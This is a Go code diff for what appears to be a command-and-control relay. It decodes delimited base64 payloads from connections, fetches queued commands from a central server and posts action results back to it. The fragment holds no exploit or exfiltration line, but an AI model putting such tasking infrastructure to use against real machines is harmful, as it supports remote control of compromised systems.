@@ -64,9 +64,10 @@ func connHandle(conn net.Conn) {
 	if err != nil {
 		fmt.Println("Error reading:", err.Error())
 	}
-	resp := MAGICSTR + "gottem" + MAGICTERMSTR
-	fmt.Println("sending: " + resp)
-	conn.Write([]byte(resp))
+	result := handlePayload(decMsg)
+	encRes := encodePayload(result)
+	fmt.Println("sending: " + encRes)
+	conn.Write([]byte(encRes))
 	conn.Close()
 }
 
@@ -82,9 +83,8 @@ func decodePayload(payload string) string {
 	return string(data)
 }
 
-func encodePayload(data string, mode string, aid string) string {
-	preEnc := mode + "||" + aid + "||" + data
-	encStr := base64.StdEncoding.EncodeToString([]byte(preEnc))
+func encodePayload(data string) string {
+	encStr := base64.StdEncoding.EncodeToString([]byte(data))
 	fin := MAGICSTR + encStr + MAGICTERMSTR
 	return fin
 }
@@ -163,17 +163,32 @@ func getCommands(payload string) string {
 		return "Error: Unable to reach server"
 	}
 	body, _ := ioutil.ReadAll(resp.Body)
-	fmt.Println("body=", string(body))
+	if string(body) == "[]" {
+		return "0:0:0" // return no commands
+	}
 	prsd := parseCommands(string(body))
 	return prsd
 }
 
-// send the action result back to the DB for feedback tracking
-func addResult(payload string, aid string) string {
-	return ""
+func postResult(aid string, result string) {
+	url := CORE + "/add/actionresult"
+	cli := http.Client{}
+	prejson := `{"actionid":"` + aid + `", "data":"` + result + `"}`
+	jsonStr := []byte(prejson)
+	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
+	req.Header.Set("Content-Type", "application/json")
+	cli.Do(req)
+	return
 }
 
-// send payload via defined connection
-func sendPayload(conn net.Conn, payload string) bool {
-	return true
+// send the action result back to the DB for feedback tracking
+func addResult(payload string, aid string) string {
+	resArray := strings.Split(payload, "<||>")
+	for _, res := range resArray {
+		splitRes := strings.Split(res, ":")
+		aid := splitRes[0]
+		result := splitRes[1]
+		postResult(aid, result)
+	}
+	return "Done"
 }
